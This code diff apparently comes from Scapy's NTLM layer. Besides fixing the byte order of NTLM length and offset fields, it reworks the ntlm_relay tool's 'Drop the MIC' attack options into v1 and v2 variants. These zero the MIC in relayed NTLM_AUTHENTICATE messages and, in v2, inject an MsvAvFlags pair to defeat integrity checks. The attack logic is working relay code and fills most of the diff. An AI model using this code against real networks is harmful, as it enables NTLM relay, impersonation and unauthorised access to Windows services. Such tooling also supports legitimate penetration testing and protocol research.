@@ -134,8 +134,8 @@ class _NTLMPayloadField(_StrField[List[Tuple[str, Any]]]):
         for field_name, value in x:
             if field_name not in self.fields_map:
                 continue
-            if not isinstance(self.fields_map[field_name],
-                              (PacketField, PacketListField)):
+            if not isinstance(self.fields_map[field_name], PacketListField) \
+                    and not isinstance(value, Packet):
                 value = getattr(self.fields_map[field_name], func)(pkt, value)
             results.append((
                 field_name,
@@ -173,15 +173,15 @@ def _NTLM_post_build(self, p, pay_offset, fields):
         # Length
         if self.getfieldval(field_name + "Len") is None:
             p = p[:offset] + \
-                struct.pack("!H", length) + p[offset + 2:]
+                struct.pack("<H", length) + p[offset + 2:]
         # MaxLength
         if self.getfieldval(field_name + "MaxLen") is None:
             p = p[:offset + 2] + \
-                struct.pack("!H", length) + p[offset + 4:]
+                struct.pack("<H", length) + p[offset + 4:]
         # Offset
         if self.getfieldval(field_name + "BufferOffset") is None:
             p = p[:offset + 4] + \
-                struct.pack("!I", pay_offset) + p[offset + 8:]
+                struct.pack("<I", pay_offset) + p[offset + 8:]
         pay_offset += length
     return p
 
@@ -536,8 +536,9 @@ class _NTLM_Automaton(Automaton):
         # type: (StreamSocket, Any) -> None
         self.token_pipe = ObjectPipe()
         self.values = {}
-        for key, dflt in [("DROP_MIC", False)]:
+        for key, dflt in [("DROP_MIC_v1", False), ("DROP_MIC_v2", False)]:
             setattr(self, key, kwargs.pop(key, dflt))
+        self.DROP_MIC = self.DROP_MIC_v1 or self.DROP_MIC_v2
         super(_NTLM_Automaton, self).__init__(
             recvsock=lambda **kwargs: sock,
             ll=lambda **kwargs: sock,
@@ -579,23 +580,25 @@ class _NTLM_Automaton(Automaton):
                 ntlm = NTLM_Header(ntlm.val)
             if isinstance(ntlm, conf.raw_layer):
                 ntlm = NTLM_Header(ntlm.load)
-        if self.DROP_MIC:
-            ntlm.MIC = None
-            ntlm.NtChallengeResponseLen = None
-            ntlm.NtChallengeResponseMaxLen = None
-            ntlm.EncryptedRandomSessionKeyBufferOffset = None
-            try:
-                ChallengeResponse = next(
-                    v[1] for v in ntlm.Payload
-                    if v[0] == 'NtChallengeResponse'
-                )
-                i = next(
-                    i for i, k in enumerate(ChallengeResponse.AvPairs)
-                    if k.AvId == 0x0006
-                )
-                del ChallengeResponse.AvPairs[i]
-            except StopIteration:
-                pass
+        if self.DROP_MIC_v1 or self.DROP_MIC_v2:
+            if isinstance(ntlm, NTLM_AUTHENTICATE):
+                ntlm.MIC = b"\0" * 16
+                ntlm.NtChallengeResponseLen = None
+                ntlm.NtChallengeResponseMaxLen = None
+                ntlm.EncryptedRandomSessionKeyBufferOffset = None
+                if self.DROP_MIC_v2:
+                    ChallengeResponse = next(
+                        v[1] for v in ntlm.Payload
+                        if v[0] == 'NtChallengeResponse'
+                    )
+                    i = next(
+                        i for i, k in enumerate(ChallengeResponse.AvPairs)
+                        if k.AvId == 0x0006
+                    )
+                    ChallengeResponse.AvPairs.insert(
+                        i + 1,
+                        AV_PAIR(AvId="MsvAvFlags", Value=0)
+                    )
         return ntlm, negResult, MIC
 
     def received_ntlm_token(self, ntlm):
@@ -673,7 +676,8 @@ def ntlm_relay(serverCls,
                remoteIP,
                remoteClientCls,
                # Classic attacks
-               DROP_MIC=False,
+               DROP_MIC_v1=False,
+               DROP_MIC_v2=False,
                DROP_EXTENDED_SECURITY=False,  # SMB1
                # Optional arguments
                ALLOW_SMB2=None,
@@ -710,8 +714,10 @@ def ntlm_relay(serverCls,
     sniffers = []
     server_kwargs = server_kwargs or {}
     client_kwargs = client_kwargs or {}
-    if DROP_MIC:
-        client_kwargs["DROP_MIC"] = server_kwargs["DROP_MIC"] = True
+    if DROP_MIC_v1:
+        server_kwargs["DROP_MIC_v1"] = client_kwargs["DROP_MIC_v1"] = True
+    if DROP_MIC_v2:
+        server_kwargs["DROP_MIC_v2"] = client_kwargs["DROP_MIC_v2"] = True
     if DROP_EXTENDED_SECURITY:
         client_kwargs["EXTENDED_SECURITY"] = False
         server_kwargs["EXTENDED_SECURITY"] = False
